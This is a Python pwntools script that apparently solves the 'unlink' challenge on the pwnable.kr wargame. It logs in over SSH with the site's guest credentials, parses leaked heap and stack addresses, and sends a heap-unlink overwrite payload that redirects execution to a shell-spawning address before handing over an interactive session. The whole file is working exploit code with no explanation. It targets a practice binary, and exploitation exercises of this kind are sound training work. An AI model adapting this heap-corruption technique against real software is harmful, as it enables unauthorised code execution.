# coding = utf-8

import pwn

def main():
	mssh = pwn.ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
	attack = mssh.process('./unlink')
	attack.recvuntil(": ")
	addr_A = int(attack.recvline(), 16)
	attack.recvuntil(": ")
	A = int(attack.recvline(), 16)
	print hex(A), hex(addr_A)
	payload = pwn.p32(0x080484eb)
	payload += 'A' * 12
	payload += pwn.p32(A + 0x0c)
	payload += pwn.p32(addr_A + 0x10)
	attack.send(payload)
	attack.interactive()

if __name__ == '__main__':
	main()
